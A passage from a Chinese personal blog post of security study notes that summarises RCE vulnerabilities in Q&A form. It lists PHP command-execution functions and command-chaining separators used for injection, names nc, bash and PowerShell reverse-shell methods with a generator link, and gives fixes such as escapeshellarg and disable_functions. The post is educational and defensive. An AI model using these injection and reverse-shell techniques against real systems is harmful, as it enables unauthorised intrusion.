+<h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><h2 id="Q1：命令执行漏洞是什么？分别叫什么？"><a href="#Q1：命令执行漏洞是什么？分别叫什么？" class="headerlink" title="Q1：命令执行漏洞是什么？分别叫什么？"></a>Q1：命令执行漏洞是什么？分别叫什么？</h2><p>remote command execution 远程命令执行</p>
+<p>remote code execution 远程代码执行</p>
+<h2 id="Q2：命令执行漏洞的危害是什么？"><a href="#Q2：命令执行漏洞的危害是什么？" class="headerlink" title="Q2：命令执行漏洞的危害是什么？"></a>Q2：命令执行漏洞的危害是什么？</h2><p>执行系统命令</p>
+<p>权限：一般情况下。RCE 漏洞的权限是 web 服务进程运行的权限（如 apache 进程权限 www-data）</p>
+<p>查看权限的命令</p>
+<p>Linux 查看权限：id</p>
+<p>Windows 查看权限：whoami /all 或 whoami /priv</p>
+<h2 id="Q3：如何挖掘-RCE-漏洞？"><a href="#Q3：如何挖掘-RCE-漏洞？" class="headerlink" title="Q3：如何挖掘 RCE 漏洞？"></a>Q3：如何挖掘 RCE 漏洞？</h2><p>黑盒测试：除了 CTF、靶场以外，现实中无法通过黑盒挖掘命令执行漏洞，大部分都是靠扫描器（X-RAY），对于 RCE 漏洞都是只扫描历史漏洞</p>
+<h2 id="Q4：如果给源代码，如何进行代审？"><a href="#Q4：如果给源代码，如何进行代审？" class="headerlink" title="Q4：如果给源代码，如何进行代审？"></a>Q4：如果给源代码，如何进行代审？</h2><p>通过找命令执行函数</p>
+<p>例如：</p>
+<ul>
+<li>system：执行系统命令，自带输出结果。</li>
+<li>shell_exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出。<ul>
+<li>例如： echo shell_exec($cmd);</li>
+</ul>
+</li>
+<li>exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，但只能输出最后一行。<ul>
+<li>例如： echo exec($cmd);</li>
+</ul>
+</li>
+<li>passthru：执行系统命令，自带输出结果。</li>
+<li>popen：执行系统命令，不会自动输出结果，需要把结果导出到文本文件中，在读取文本文件中保存好的命令执行结果。</li>
+<li>`(反引号）：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，和shell_exec 一致。</li>
+</ul>
+<h2 id="Q5：RCE漏洞中，命令拼接符有哪些？"><a href="#Q5：RCE漏洞中，命令拼接符有哪些？" class="headerlink" title="Q5：RCE漏洞中，命令拼接符有哪些？"></a>Q5：RCE漏洞中，命令拼接符有哪些？</h2><p>&amp;&amp;		||	|	;（Windows 不支持）	&amp;</p>
+<h2 id="Q6：如何反弹-shell？"><a href="#Q6：如何反弹-shell？" class="headerlink" title="Q6：如何反弹 shell？"></a>Q6：如何反弹 shell？</h2><ol>
+<li>nc 反弹 shell</li>
+<li>bash 反弹 shell</li>
+<li>（Windows）powershell 反弹shell	<a target="_blank" rel="noopener" href="https://www.revshells.com/">Online - Reverse Shell Generator</a></li>
+</ol>
+<h2 id="Q7：如何修复-RCE-漏洞？"><a href="#Q7：如何修复-RCE-漏洞？" class="headerlink" title="Q7：如何修复 RCE 漏洞？"></a>Q7：如何修复 RCE 漏洞？</h2><ol>
+<li>后端限制用户输入的内容格式，如输入 ip（验证用户输入的是不是 ip）</li>
+<li>php 自带函数（禁用）<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.escapeshellarg.php">PHP: escapeshellarg - Manual</a></li>
+<li>在给源代码的情况下，找 PHP 配置中的 disable_functions=shell_exec、system、exec、passthru、popen</li>
+</ol>
+<blockquote>
+<p>本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://jasmine-iris.top">Jasmine_Iris</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://jasmine-iris.top/2026/06/08/RCE%E6%BC%8F%E6%B4%9E/">https://jasmine-iris.top/2026/06/08/RCE%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://jasmine-iris.top" target="_blank">Jasmine_Iris</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/RCE/">RCE</a></div><div class="post-share"><div class="social-share" data-image="https://img.jasmine-iris.top/posts/RCE漏洞/cover.webp" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/06/13/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/" title="御网杯2026 Web部分题解"><img class="cover" src="https://img.jasmine-iris.top/posts/题解-御网杯Web/cover.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">御网杯2026 Web部分题解</div></div><div class="info-2"><div class="info-item-1">御网杯网络安全竞赛Web方向部分题解</div></div></div></a><a class="pagination-related" href="/2026/06/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" title="文件包含漏洞"><img class="cover" src="https://img.jasmine-iris.top/posts/文件包含漏洞/cover.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">文件包含漏洞</div></div><div class="info-2"><div class="info-item-1">文件包含漏洞的原理、本地/远程包含攻击手法、伪协议利用与防御方案</div></div></div></a></nav><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar" loading='lazy'></div><div class="author-info-name">Jasmine_Iris</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Jasmineee007"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Jasmineee007" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://gitee.com/jasminee0762" target="_blank" title="Gitee"><i class="fab fa-gitee" style="color: #c71d23;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客~ 📝<br><hr>最近更新：2026-08-15<br><br>新增文章：<br><a href="/2026/08/15/APT%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E4%B9%8B%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/">APT攻击手段之钓鱼邮件</a><br><a href="/2026/08/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7-Cobalt-Strike/">内网渗透工具-Cobalt Strike</a><br></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81RCE%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%8D%B1%E5%AE%B3"><span class="toc-text">一、RCE简介与危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%9D%B6%E5%9C%BA"><span class="toc-text">二、墨者学院靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B1%EF%BC%9APing%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">案例1：Ping命令注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B2-PHP%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">案例2 PHP反引号命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B3-CVE-2019-15107-Webmin-RCE%E6%BC%8F%E6%B4%9E"><span class="toc-text">案例3 CVE-2019-15107 Webmin RCE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Webmin-%E4%BB%8B%E7%BB%8D"><span class="toc-text">(1) Webmin 介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%83%A8%E7%BD%B2"><span class="toc-text">(2) 部署</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%93%8D%E4%BD%9C"><span class="toc-text">(3) 操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B4-PbootCMS%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">案例4 PbootCMS代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">(1) 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%93%8D%E4%BD%9C"><span class="toc-text">(2) 操作</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81RCE%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-text">三、RCE漏洞防御方案</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">四、总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Q1%EF%BC%9A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E5%88%86%E5%88%AB%E5%8F%AB%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">Q1：命令执行漏洞是什么？分别叫什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q2%EF%BC%9A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B1%E5%AE%B3%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">Q2：命令执行漏洞的危害是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q3%EF%BC%9A%E5%A6%82%E4%BD%95%E6%8C%96%E6%8E%98-RCE-%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-text">Q3：如何挖掘 RCE 漏洞？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q4%EF%BC%9A%E5%A6%82%E6%9E%9C%E7%BB%99%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%BB%A3%E5%AE%A1%EF%BC%9F"><span class="toc-text">Q4：如果给源代码，如何进行代审？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q5%EF%BC%9ARCE%E6%BC%8F%E6%B4%9E%E4%B8%AD%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%AC%A6%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-text">Q5：RCE漏洞中，命令拼接符有哪些？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q6%EF%BC%9A%E5%A6%82%E4%BD%95%E5%8F%8D%E5%BC%B9-shell%EF%BC%9F"><span class="toc-text">Q6：如何反弹 shell？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q7%EF%BC%9A%E5%A6%82%E4%BD%95%E4%BF%AE%E5%A4%8D-RCE-%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-text">Q7：如何修复 RCE 漏洞？</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/08/16/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/" title="社会工程学"><img src="https://img.jasmine-iris.top/posts/社会工程学/cover.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="社会工程学" loading='lazy'></a><div class="content"><a class="title" href="/2026/08/16/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/" title="社会工程学">社会工程学</a><time datetime="2026-08-16T06:00:00.000Z" title="发表于 2026-08-16 14:00:00">2026-08-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/08/15/APT%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E4%B9%8B%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/" title="APT攻击手段之钓鱼邮件"><img src="https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/cover.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="APT攻击手段之钓鱼邮件" loading='lazy'></a><div class="content"><a class="title" href="/2026/08/15/APT%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E4%B9%8B%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/" title="APT攻击手段之钓鱼邮件">APT攻击手段之钓鱼邮件</a><time datetime="2026-08-15T05:50:00.000Z" title="发表于 2026-08-15 13:50:00">2026-08-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©&nbsp;2025 - 2026 By Jasmine_Iris</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://waline.jasmine-iris.top',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client@3.8.0/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client@3.8.0/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline }
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script>if(document.getElementById("page-header")&&document.getElementById("page-header").classList.contains("full_page")){var bg=document.getElementById("web_bg");if(bg)bg.style.backgroundImage="url(/img/home-bg.png)";}</script><script>document.documentElement.classList.add(GLOBAL_CONFIG.pageType==='home'?'is-home':'not-home');(function(){if(GLOBAL_CONFIG.pageType!=='home')return;var t=sessionStorage.getItem('auto-scrolled');if(t)return;sessionStorage.setItem('auto-scrolled','1');setTimeout(function(){var el=document.getElementById('content-inner');if(el)btf.scrollToDest(el.offsetTop,600)},1500)})()</script><script>(function(){document.addEventListener('click',function(e){if(e.target.closest('.card-tag-cloud a, .article-tag-list a, .site-data a[href="/tags/"]')){e.preventDefault()}})})()</script><script src="/js/copy-guard.js?v=2"></script><script src="/js/cursor.js"></script><script>(function(){var article=document.getElementById('article-container'),cardToc=document.getElementById('card-toc');if(!article||!cardToc)return;var lastH=article.offsetHeight,t=null;function recalc(){if(Math.abs(article.offsetHeight-lastH)<=3)return;lastH=article.offsetHeight;clearTimeout(t);t=setTimeout(function(){window.dispatchEvent(new Event('resize'))},150)}if(window.ResizeObserver)new ResizeObserver(recalc).observe(article);document.addEventListener('load',recalc,true)})()</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索..." type="text"></div><hr><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
